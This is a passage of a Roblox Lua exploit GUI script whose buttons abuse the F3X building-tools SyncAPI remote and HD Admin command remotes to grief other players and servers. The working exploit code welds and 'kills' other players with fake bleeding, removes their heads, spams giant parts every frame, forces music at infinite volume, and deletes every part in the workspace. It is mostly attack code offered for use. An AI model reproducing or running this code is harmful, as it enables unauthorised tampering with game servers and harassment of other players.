					TextLabel.TextYAlignment = Enum.TextYAlignment.Center
	
					TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	
					TextLabel.Text = ""
	
					TextLabel.BackgroundTransparency = 1
	
					Frame.Parent = TextLabel
	
					Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
	
					Frame.BorderSizePixel = 0
	
					Frame.Transparency = 1
	
					Frame.Position = UDim2.new(0, 0, 1, 0)
	
					Frame.Size = UDim2.new(1, 0, 0, 5)
	
					for i = 1, 8 do
	
						TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
	
						TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
	
						Frame.Transparency = Frame.Transparency - 0.1
	
						task.wait()
	
					end
	
					msg = "  || " .. msg
	
					for i = 1, #msg do
	
						TextLabel.Text = string.sub(msg, 1, i)
	
						task.wait()
	
					end
	
					task.wait(1)
	
					for i = 1, 8 do
	
						TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
	
						TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
	
						Frame.Transparency = Frame.Transparency + 0.1
	
						task.wait()
	
					end
	
					TextLabel:Destroy()
	
				end)()
	
			end
	
			RequestCommand:InvokeServer(";hat me 18268136683")
	
			yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
	
			if yeah then
	
				notify("Script has successfully worked!")
	
				task.wait(3)
	
				notify("Lets stab some skids! shall we?")
	
			elseif not yeah then
	
				notify("Btools/F3X wasnt found, script cant work here.")
	
			end
	
			local tool
	
			for _, v in player:GetDescendants() do
	
				if v.Name == "SyncAPI" then
	
					tool = v.Parent
	
				end
	
			end
	
			for _, v in game.ReplicatedStorage:GetDescendants() do
	
				if v.Name == "SyncAPI" then
	
					tool = v.Parent
	
				end
	
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
			function _(args)
	
				remote:InvokeServer(unpack(args))
	
			end
	
			function SetCollision(part, boolean)
	
				local args = {
	
					[1] = "SyncCollision",
	
					[2] = {
	
						[1] = {
	
							["Part"] = part,
	
							["CanCollide"] = boolean
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function SetLocked(part,boolean)
	
				local args = {
	
					[1] = "SetLocked",
	
					[2] = {
	
						[1] = part
	
					},
	
					[3] = boolean
	
				}
	
				_(args)
	
			end
	
			function yerpp(E)
	
				local argsCreate = {
	
					[1] = "CreateDecorations",
	
					[2] = {
	
						[1] = {
	
							["Part"] = E,
	
							["DecorationType"] = "Sparkles"
	
						}
	
					}
	
				}
	
	
	
				local argsSync = {
	
					[1] = "SyncDecorate",
	
					[2] = {
	
						[1] = {
	
							["Part"] = E,
	
							["DecorationType"] = "Sparkles",
	
							["SparkleColor"] = Color3.fromRGB(255, 255, 0)
	
						} 
	
					} 
	
				}
	
				_(argsCreate)
	
				_(argsSync)
	
			end
	
			local knfe = character["Accessory (Knife McGrabbington III)"]
	
			if knfe then
	
				local args = {
	
					"Remove",
	
					{
	
						knfe.Handle.SpecialMesh
	
					}
	
				}
	
				_(args)
	
			end
	
			local function Resize(part, size, ha)
	
				local args = {
	
					"SyncResize",
	
					{
	
						{
	
							Part = part,
	
							CFrame = ha,
	
							Size = size
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			local function SetAnchor(boolean, part)
	
				local args = {
	
					"SyncAnchor",
	
					{
	
						{
	
							Part = part,
	
							Anchored = boolean
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function MovePart(part, cf)
	
				local args = {
	
					[1] = "SyncMove",
	
					[2] = {
	
						[1] = {
	
							["Part"] = part,
	
							["CFrame"] = cf
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			local function Color(part, color)
	
				local args = {
	
					"SyncColor",
	
					{
	
						{
	
							Part = part,
	
							Color = color,
	
							UnionColoring = false
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function AddMesh(part)
	
				local args = {
	
					[1] = "CreateMeshes",
	
					[2] = {
	
						[1] = {
	
							["Part"] = part
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function DestroyPart(part)
	
				local args = {
	
					[1] = "Remove",
	
					[2] = {
	
						[1] = part
	
					}
	
				}
	
				_(args)
	
			end
	
			function SetMesh(part,meshid,offseter)
	
				local args = {
	
					[1] = "SyncMesh",
	
					[2] = {
	
						[1] = {
	
							["Offset"] = offseter,
	
							["Part"] = part,
	
							["MeshId"] = "rbxassetid://"..meshid
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function SetTexture(part, texid)
	
				local args = {
	
					[1] = "SyncMesh",
	
					[2] = {
	
						[1] = {
	
							["Part"] = part,
	
							["TextureId"] = "rbxassetid://" .. texid
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			function SetTrans(part,int)
	
				local args = {
	
					[1] = "SyncMaterial",
	
					[2] = {
	
						[1] = {
	
							["Part"] = part,
	
							["Transparency"] = int
	
						}
	
					}
	
				}
	
				_(args)
	
			end
	
			spawn(function()
	
				yerpp(knfe.Handle)
	
			end)
	
			spawn(function()
	
				AddMesh(knfe.Handle)
	
			end)
	
			spawn(function()
	
				SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
	
			end)
	
			spawn(function()
	
				SetTexture(knfe.Handle, "80617091791234")
	
			end)
	
			function bleed(target)
	
				if not target or not target.Character then return end
	
	
	
				local stopBleeding = false
	
				local activeBloodParts = {} 
	
				local characterConnection
	
				characterConnection = target.CharacterAdded:Connect(function()
	
					stopBleeding = true
	
					for _, blood in pairs(activeBloodParts) do
	
						if blood and blood.Parent then
	
							DestroyPart(blood)
	
						end
	
					end
	
					if characterConnection then
	
						characterConnection:Disconnect()
	
					end
	
				end)
	
	
	
				coroutine.wrap(function()
	
					while not stopBleeding and target and target.Character do
	
						local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
	
						local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
	
	
	
						if rootPart then
	
							coroutine.wrap(function()
	
								yez=CFrame.new(0,-10,0)
	
								local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
	
								if blood then
	
									table.insert(activeBloodParts, blood)
	
	
	
									spawn(function()
	
										Color(blood, Color3.fromRGB(100, 0, 0))
	
									end)
	
	
	
									spawn(function()
	
										Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
	
									end)
	
									spawn(function()
	
										SetAnchor(false, blood)
	
									end)
	
									coroutine.wrap(function()
	
										wait(2)
	
										Resize(blood, Vector3.new(3, 0.1, 3),blood.CFrame)
	
										Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
	
										SetTrans(blood, 0.9)
	
										SetTrans(blood, 0.7)
	
										SetTrans(blood, 0.5)
	
										SetTrans(blood, 0.3)
	
										SetTrans(blood, 0.1)
	
										DestroyPart(blood)
	
	
	
	
	
										for i, v in pairs(activeBloodParts) do
	
											if v == blood then
	
												table.remove(activeBloodParts, i)
	
												break
	
											end
	
										end
	
									end)()
	
								end
	
							end)()
	
						end
	
	
	
						wait(0.005)
	
					end
	
				end)()
	
			end
	
			function c0lefect(E)
	
				local argsCreate = {
	
					[1] = "CreateDecorations",
	
					[2] = {
	
						[1] = {
	
							["Part"] = E,
	
							["DecorationType"] = "Sparkles"
	
						}
	
					}
	
				}
	
	
	
				local argsSync = {
	
					[1] = "SyncDecorate",
	
					[2] = {
	
						[1] = {
	
							["Part"] = E,
	
							["DecorationType"] = "Sparkles",
	
							["SparkleColor"] = Color3.fromRGB(255, 255, 0)
	
						} 
	
					} 
	
				}
	
				local args = {
	
					"Remove",
	
					{
	
						E:FindFirstChild('Sparkles')
	
					}
	
				}
	
				_(argsCreate)
	
				_(argsSync)
	
				task.wait(1)
	
				_(args)
	
			end
	
			function Weld(part1, part2,lead)
	
				local args = {
	
					[1] = "CreateWelds",
	
					[2] = {
	
						[1] = part1,
	
						[2] = part2
	
					},
	
					[3] = lead
	
				}
	
				_(args)
	
	
	
			end
	
			function breakWelds(part)
	
				local welds = {}
	
				for _, weld in ipairs(part:GetDescendants()) do
	
					if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
	
						table.insert(welds, weld)
	
					end
	
				end
	
				if #welds == 0 then
	
					return false
	
				end
	
				local args = {
	
					"RemoveWelds",
	
					welds
	
				}
	
				_(args)
	
				return true
	
			end
	
			local humanoid = character:FindFirstChildOfClass("Humanoid")
	
			local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
	
			local holdAnimation = Instance.new("Animation")
	
			holdAnimation.AnimationId = "rbxassetid://48146273"
	
			local holdTrack = humanoid:LoadAnimation(holdAnimation)
	
			local killAnimation = Instance.new("Animation")
	
			killAnimation.AnimationId = "rbxassetid://48146273"
	
			local killTrack = humanoid:LoadAnimation(killAnimation)
	
			local knifeHoldAnim = Instance.new("Animation")
	
			knifeHoldAnim.AnimationId = "rbxassetid://299225058"
	
			local staffupAnim = Instance.new("Animation")
	
			staffupAnim.AnimationId = "rbxassetid://27432691"
	
			local swordhitAnim = Instance.new("Animation")
	
			swordhitAnim.AnimationId = "rbxassetid://27432686"
	
			local holdstaffAnim = Instance.new("Animation")
	
			holdstaffAnim.AnimationId = "rbxassetid://57794492"
	
			local stabAnim = Instance.new("Animation")
	
			stabAnim.AnimationId = "rbxassetid://30174375"
	
			local track1 = humanoid:LoadAnimation(staffupAnim)
	
			local track2 = humanoid:LoadAnimation(swordhitAnim)
	
			holdTrack = humanoid:LoadAnimation(holdstaffAnim)
	
			function GrabAnim()
	
				track1.Looped = false
	
				track2.Looped = false
	
				holdTrack.Looped = false
	
				track1:Play()
	
				track1.Stopped:Wait()
	
				track2:Play()
	
				track2.Stopped:Wait()
	
				holdTrack:Play()
	
				holdTrack:AdjustSpeed(0)
	
			end
	
			function Kill()
	
				local stabTrack = humanoid:LoadAnimation(stabAnim)
	
				stabTrack.Looped = false
	
				stabTrack:Play()
	
				stabTrack.Stopped:Wait()
	
				if holdTrack then holdTrack:Stop() end
	
			end
	
			function failed()
	
				track1.Looped = false
	
				track2.Looped = false
	
				holdTrack.Looped = false
	
				track1:Play()
	
				track1:AdjustSpeed(3)
	
				track1.Stopped:Wait()
	
	
	
				holdTrack:Play()
	
				wait(0.3)
	
				holdTrack:Stop()
	
			end
	
			local isBusy = false
	
			local alignPosition
	
			local alignOrientation
	
			local Players = game:GetService("Players")
	
			local player = Players.LocalPlayer 
	
			local function attachBehind(targetChar)
	
				local root = character:FindFirstChild("HumanoidRootPart")
	
				local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	
				if root and targetRoot then
	
	
	
					local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
	
					local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
	
	
	
					alignPosition = Instance.new("AlignPosition")
	
					alignPosition.MaxForce = 1000000
	
					alignPosition.Responsiveness = 200
	
					alignPosition.Attachment0 = attachment0
	
					alignPosition.Attachment1 = attachment1
	
					alignPosition.Parent = root
	
					alignOrientation = Instance.new("AlignOrientation")
	
					alignOrientation.MaxTorque = 1000000
	
					alignOrientation.Responsiveness = 200
	
					alignOrientation.Attachment0 = attachment0
	
					alignOrientation.Attachment1 = attachment1
	
					alignOrientation.Parent = root
	
	
	
					attachment1.Position = Vector3.new(0, 0, 0.4)
	
				end
	
			end
	
			local function detach()
	
				if alignPosition then
	
					alignPosition:Destroy()
	
					alignPosition = nil
	
				end
	
				if alignOrientation then
	
					alignOrientation:Destroy()
	
					alignOrientation = nil
	
				end
	
			end
	
			local function attacke()
	
				if isBusy then return end
	
				isBusy = true
	
				local hitPlayer = nil
	
				local touchedConnection
	
				local function onTouch(other)
	
					local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
	
					if otherPlayer and otherPlayer ~= player then
	
						hitPlayer = otherPlayer
	
					end
	
				end
	
				touchedConnection = arm.Touched:Connect(onTouch)
	
				task.wait(0.15)
	
				if touchedConnection then
	
					touchedConnection:Disconnect()
	
				end
	
				if hitPlayer and hitPlayer.Character then
	
	
	
					RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
	
	
	
	
	
					track1.Looped = false
	
					track2.Looped = false
	
					holdTrack.Looped = false
	
					track1:Play()
	
					track1.Stopped:Wait()
	
					track2:Play()
	
					track2:AdjustSpeed(3)
	
					track2.Stopped:Wait()
	
					holdTrack:Play()
	
	
	
					holdTrack:AdjustSpeed(0)
	
					spawn(function()
	
						attachBehind(hitPlayer.Character)
	
						wait(0.8)
	
						detach()
	
					end)
	
					spawn(function()
	
						SetLocked(hitPlayer.Character.Torso, false)
	
					end)
	
					spawn(function()
	
						SetLocked(char.Torso, false)
	
					end)
	
					Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
	
					Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
	
					Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
	
					wait(3)
	
					spawn(function()
	
						Kill()
	
					end)
	
					bleed(hitPlayer)
	
					wait(0.45)
	
					RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
	
					wait(0.5)
	
					breakWelds(character.Torso)
	
					breakWelds(hitPlayer.Character.Torso)
	
					spawn(function()
	
						wait(0.8)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character.Torso, false)
	
						end)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character["Right Arm"], false)
	
						end)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character["Left Arm"], false)
	
						end)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character["Right Leg"], false)
	
						end)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character["Left Leg"], false)
	
						end)
	
						spawn(function()
	
							SetCollision(hitPlayer.Character.Torso, true)
	
						end)
	
						spawn(function()
	
							SetCollision(hitPlayer.Character["Right Arm"], true)
	
						end)
	
						spawn(function()
	
							SetCollision(hitPlayer.Character["Left Arm"], true)
	
						end)
	
						spawn(function()
	
							SetCollision(hitPlayer.Character["Right Leg"], true)
	
						end)
	
						spawn(function()
	
							SetCollision(hitPlayer.Character["Left Leg"], true)
	
						end)
	
					end)
	
					wait(0.3)
	
	
	
	
	
					isBusy = false
	
	
	
				else
	
	
	
					failed()
	
					wait(0.4)
	
					isBusy = false
	
				end
	
			end
	
			local args = {
	
				"Remove",
	
				{
	
					knfe.Handle
	
				}
	
			}
	
			_(args)
	
			knfe:Destroy()
	
			RequestCommand:InvokeServer(";hat me 18420472059")
	
			task.wait(1)
	
			local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
	
			spawn(function()
	
				local args = {
	
					"Remove",
	
					{
	
						knife.Handle.SpecialMesh
	
					}
	
				}
	
				_(args)
	
			end)
	
			spawn(function()
	
				AddMesh(knife.Handle)
	
			end)
	
			spawn(function()
	
				SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0.50,-0.25))
	
			end)
	
			spawn(function()
	
				SetTexture(knife.Handle, "80617091791234")
	
			end)
	
			ready = true
	
			UserInputService.InputBegan:Connect(function(input, gameProcessed)
	
				if gameProcessed then return end
	
				if input.UserInputType == Enum.UserInputType.MouseButton1 and ready == true then
	
					attacke()
	
				end
	
			end)
	
		end
	
	end)
end;
task.spawn(C_6b);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_6d()
local script = G2L["6d"];
	script.Parent.MouseButton1Click:Connect(function()
		--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
	
		local function Color(part, color)
			local args = {
				"SyncColor",
				{
					{
						Part = part,
						Color = color,
						UnionColoring = false
					}
				}
			}
			_(args)
		end
	
		local function applyDecorationToPart(part) 
	
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
	
	
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = 3,
						["Heat"] = 25,
						["Color"] = Color3.fromRGB(255, 0, 0), 
						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
					} 
				} 
			}
	
	
			_(argsCreate)
			_(argsSync)
		end
	
		local function Parter(part) 
	
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Smoke"
					}
				}
			}
	
	
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Smoke",
						["Size"] = 3,
						["Color"] = Color3.fromRGB(255, 0, 0),  
					} 
				} 
			}
	
	
			_(argsCreate)
			_(argsSync)
		end
		local function eyePart(part) 
	
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
	
	
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = 1,
						["Heat"] = 12,
						["Color"] = Color3.fromRGB(155, 0, 0), 
						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
					} 
				} 
			}
	
	
			_(argsCreate)
			_(argsSync)
		end
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
		local Players = game:GetService("Players")
	
		local UserInputService = game:GetService("UserInputService")
	
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
	
	
	
	
		local player = Players.LocalPlayer
	
		local character = player.Character or player.CharacterAdded:Wait()
	
	
		RequestCommand:InvokeServer(";removeaccessories")
		RequestCommand:InvokeServer(";titlebk me John Doe")
	
		wait(1)
		RequestCommand:InvokeServer(";hat me 107676946962151")
		wait(0.5)
		RequestCommand:InvokeServer(";hat me 18196403126")
		wait(0.5)
		RequestCommand:InvokeServer(";hat me 18801497637")
		wait(0.5)
		RequestCommand:InvokeServer(";shirt me 100276101149100")
		RequestCommand:InvokeServer(";pants me 109662040845019")
		RequestCommand:InvokeServer(";head me 0")
		RequestCommand:InvokeServer(";face me 144075659")
	
	
		wait(1)
	
		local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
		local arm = char:FindFirstChild("Right Arm")
		local tor = char:FindFirstChild("Torso")
		local ar2 = char:FindFirstChild("Left Arm")
	
		local RLeg = char:FindFirstChild("Right Leg")
		local head = char:FindFirstChild("Head")
		local LLeg = char:FindFirstChild("Left Leg")
		applyDecorationToPart(arm)
		applyDecorationToPart(ar2)
		eyePart(eye)
		Parter(tor)
	
		Color(arm, Color3.fromRGB(252, 255, 150))
		Color(ar2, Color3.fromRGB(252, 255, 150))
		Color(head, Color3.fromRGB(252, 255, 150))
		Color(tor, Color3.fromRGB(255, 255, 0))
		Color(RLeg, Color3.fromRGB(0, 200, 255))
		Color(LLeg, Color3.fromRGB(0, 200, 255))
	
	
	
		local arm = character:FindFirstChild("Right Arm") 
		local humanoid = character:FindFirstChildOfClass("Humanoid")
	
	
		local isDead = false
	
		humanoid.Died:Connect(function()
			isDead = true
		end)
	
	
		local animator = humanoid:FindFirstChildOfClass("Animator")
	
		local attackAnim = Instance.new("Animation")
		attackAnim.AnimationId = "rbxassetid://186934658"
		local attackTrack = animator:LoadAnimation(attackAnim)
	
		function KillTarget(target)
			if target and target.Character then
				local head = target.Character:FindFirstChild("Head")
				if head then
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = head
						},
	
						[3] = false
					}
					remote:InvokeServer(unpack(args))
					task.wait(0.1) 
					local args2 = {
						[1] = "Remove",
						[2] = {
							[1] = head
						}
					}
					remote:InvokeServer(unpack(args2))
				end
			end
		end
	
	
		local function attack()
			attackTrack:Play() 
			local hitPlayer = nil
			local touchedConnection
	
			local function onTouch(other)
				local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
				if otherPlayer and otherPlayer ~= player then
					hitPlayer = otherPlayer
				end
			end
	
			touchedConnection = arm.Touched:Connect(onTouch)
			task.wait(0.5)
			if touchedConnection then
				touchedConnection:Disconnect()
			end
			if hitPlayer then
				RequestCommand:InvokeServer(" ")
	
				KillTarget(hitPlayer)
				task.wait(1)
	
			end
	
		end
	
	
		local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
		screenGui.Name = "AttackButtonGui"
	
		local attackButton = Instance.new("TextButton")
		attackButton.Name = "AttackButton"
		attackButton.Parent = screenGui
		attackButton.Size = UDim2.new(0, 160, 0, 50)
		attackButton.Position = UDim2.new(0.5, -80, 1, -90)
		attackButton.AnchorPoint = Vector2.new(0.5, 0)
		attackButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		attackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		attackButton.Font = Enum.Font.GothamBold
		attackButton.Text = "attack"
		attackButton.TextSize = 22
		attackButton.AutoButtonColor = true
		attackButton.ZIndex = 999
	
	
		attackButton.MouseButton1Click:Connect(function()
			if not isDead then
				attack()
			end
		end)
	end)
end;
task.spawn(C_6d);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_6f()
local script = G2L["6f"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf,parent,types)
			local args = {[1]="CreatePart",[2]=types or "Normal",[3]=cf,[4]=parent}
			_(args)
		end
	
		function Resize(part,size,cf)
			local args = {[1]="SyncResize",[2]={[1]={["Part"]=part,["CFrame"]=cf,["Size"]=size}}}
			_(args)
		end
	
		function AddMesh(part)
			local args = {[1]="CreateMeshes",[2]={[1]={["Part"]=part}}}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {[1]="SyncMesh",[2]={[1]={["Part"]=part,["MeshId"]="rbxassetid://"..meshid}}}
			_(args)
		end
	
		function MeshResize(part,size)
			local args = {[1]="SyncMesh",[2]={[1]={["Part"]=part,["Scale"]=size}}}
			_(args)
		end
	
		function Color(part,color)
			local args = {[1]="SyncColor",[2]={[1]={["Part"]=part,["Color"]=color,["UnionColoring"]=false}}}
			_(args)
		end
	
		function SetCollision(part,boolean)
			local args = {[1]="SyncCollision",[2]={[1]={["Part"]=part,["CanCollide"]=boolean}}}
			_(args)
		end
	
		local RunService = game:GetService("RunService")
	
		RunService.Heartbeat:Connect(function(dt)
			task.spawn(function()
				if char and char:FindFirstChild("HumanoidRootPart") then
					local randomOffset = Vector3.new(
						math.random(-50, 50),
						math.random(10, 50),
						math.random(-50, 50)
					)
	
					local spawnPos = char.HumanoidRootPart.CFrame * CFrame.new(randomOffset.X, randomOffset.Y, randomOffset.Z)
					CreatePart(spawnPos, workspace, "Normal")
					wait(0.05)
	
					for i,v in game.Workspace:GetChildren() do
						if v:IsA("BasePart") and (v.CFrame.Position - spawnPos.Position).Magnitude < 10 and not v.Parent:FindFirstChild("Humanoid") then
							Resize(v, Vector3.new(500, 500, 500), spawnPos)
							AddMesh(v)
							wait(0.05)
							SetMesh(v, "11938008728")
							MeshResize(v, Vector3.new(500, 500, 500))
							Color(v, Color3.fromHSV(math.random(), 1, 1))
							SetCollision(v, true)
							break
						end
					end
				end
			end)
		end)
	end)
end;
task.spawn(C_6f);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_71()
local script = G2L["71"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local RunService = game:GetService("RunService")
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function SetAnchor(part, boolean)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function reflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
	
		function SetTransparency(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		local images = {
			"http://www.roblox.com/asset/?id=169585459",
			"http://www.roblox.com/asset/?id=169585475",
			"http://www.roblox.com/asset/?id=169585485",
			"http://www.roblox.com/asset/?id=169585502",
			"http://www.roblox.com/asset/?id=169585515",
			"http://www.roblox.com/asset/?id=169585502",
			"http://www.roblox.com/asset/?id=169585485",
			"http://www.roblox.com/asset/?id=169585475"
		}
	
		local skyPart
		local skyLoop
	
		function CreateSky()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, -6, 0)), workspace)
	
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, -6, 0) then
					skyPart = v
					SetAnchor(skyPart, true)
					AddMesh(skyPart)
					SetMesh(skyPart, "111891702759441")
					MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
					SetTransparency(skyPart, 1)
					reflect(skyPart, 1000)
	
					local currentFrame = 0
					local frameInterval = 0.1
	
					skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
	
						currentFrame = currentFrame + deltaTime
	
						if currentFrame >= frameInterval then
							currentFrame = 0
	
							local index = math.floor((tick() / frameInterval) % #images) + 1
	
							pcall(function()
								SetTransparency(skyPart, 0)
								SetTexture(skyPart, images[index])
							end)
						end
					end)
					break
				end
			end
		end
	
		function ResetSky()
			if skyPart then
				DestroyPart(skyPart)
				skyPart = nil
			end
			if skyLoop then
				skyLoop:Disconnect()
				skyLoop = nil
			end
			CreateSky()
		end
	
		player.CharacterAdded:Connect(function(newChar)
			char = newChar
			ResetSky()
		end)
	
		if char and char:FindFirstChild("Humanoid") then
			char:WaitForChild("Humanoid").Died:Connect(function()
				ResetSky()
			end)
		end
	
		CreateSky()
	end)
end;
task.spawn(C_71);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_72()
local script = G2L["72"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";music 108598153096177 ;pitch 0.14 ;volume inf")
	
	end)
end;
task.spawn(C_72);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_75()
local script = G2L["75"];
	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
	
		local character = player.Character 
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			return nil
		end
	
		-- get all info
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function deleteall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "Sky" then
					spawn(function()
						delete(v)
					end)
				end
			end
		end
	
		deleteall()
	
	end)
end;
